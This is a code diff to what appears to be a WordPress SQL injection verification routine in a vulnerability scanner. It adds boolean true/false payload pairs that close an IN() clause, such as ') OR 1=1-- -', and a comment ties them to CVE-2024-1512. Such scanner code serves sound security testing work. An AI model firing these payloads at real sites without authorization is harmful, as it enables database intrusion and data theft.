@@ -7275,6 +7275,10 @@ def verify_wordpress_sqli(
                 (f'{orig_value}" OR "1"="1', f'{orig_value}" OR "1"="2'),
                 (f"{orig_value}') OR ('1'='1", f"{orig_value}') OR ('1'='2"),
                 (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
+                # IN-clause injection: closes the in() paren, adds OR/AND after
+                # e.g. meta.meta_value in (1) OR 1=1-- -) for CVE-2024-1512
+                (f"{orig_value}) OR 1=1-- -", f"{orig_value}) AND 1=2-- -"),
+                (f"{orig_value}') OR 1=1-- -", f"{orig_value}') AND 1=2-- -"),
             ]
         bool_tried = []
         consistent_diffs = 0
@@ -7312,6 +7316,9 @@ def verify_wordpress_sqli(
                 (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
                 (f"{orig_value} OR 1=1-- -", f"{orig_value} OR 1=2-- -"),
                 (f"{orig_value}' OR 1=1-- -", f"{orig_value}' OR 1=2-- -"),
+                # IN-clause: closes in() bracket then OR/AND
+                (f"{orig_value}) OR 1=1-- -", f"{orig_value}) AND 1=2-- -"),
+                (f"{orig_value}') OR 1=1-- -", f"{orig_value}') AND 1=2-- -"),
             ]
             for _exp_t, _exp_f in _exp_pairs:
                 try:
